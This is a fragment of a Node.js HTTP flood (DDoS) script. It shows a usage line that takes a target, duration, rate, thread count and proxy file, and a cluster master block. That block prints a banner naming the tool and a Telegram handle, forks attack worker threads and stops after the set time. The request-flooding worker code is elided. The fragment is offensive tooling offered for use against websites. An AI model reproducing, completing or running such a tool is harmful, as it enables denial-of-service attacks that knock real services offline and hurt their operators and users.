...
Usage: node HTTP.js Target Time Rate Thread ProxyFile
...
if (cluster.isMaster){
  console.clear();
  console.log(`
           METHOD DDOS LATER 7 DEVELOPMENT BY t.me/udpflood53                 
                        Press Ctrl+Z To Stop DDoS
`);
  
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`${getCurrentTime()} [HTTP]  Attack Thread ${i} Started`);
  }
  console.log(`${getCurrentTime()} [HTTP]  The Attack Has Started`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`${getCurrentTime()} [HTTP]  The Attack Is Over`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
